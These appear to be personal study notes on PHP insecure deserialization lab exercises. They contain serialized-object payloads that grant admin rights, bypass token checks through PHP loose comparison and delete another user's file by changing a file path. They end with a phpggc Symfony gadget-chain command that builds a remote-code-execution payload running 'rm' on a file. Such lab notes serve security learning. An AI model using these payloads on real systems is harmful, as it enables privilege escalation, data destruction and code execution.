# Modifying object attributes
o -> Object
s -> String (In this case the number count how many characters have the atrribute)
b -> boolean
i -> integer
```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```
In the last of the query we see a boolean in false so I try to change it
```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
```
# Modifying object attributes
In php if we compare a string with a integer that give us True:
- 5 == "5"
- 5 == "5 of something" (Take at the beginning all numbers)

In php 7.x and earlier the comparison 0 == "Example string" is true
```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"fvldisg9i5tcgj967j0b8074ocuzhnwh";}
```
Change from string to integer
```
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

# Using application functionality
Delete and account and private information with a LFI
```
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"z3lfeay545c0nkb2d6x1y84gjvbe5iii";s:11:"avatar_link";s:19:"users/wiener/avatar";}
```
Change to
```
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"z3lfeay545c0nkb2d6x1y84gjvbe5iii";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```

# Injecting arbitrary objects
Note: We can see the code of the file if we put at the end this character "~", because somtehing save a backup with the same name with "~" at the end
```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"fvldisg9i5tcgj967j0b8074ocuzhnwh";}
```
```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

# hpggc
```
phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0
```


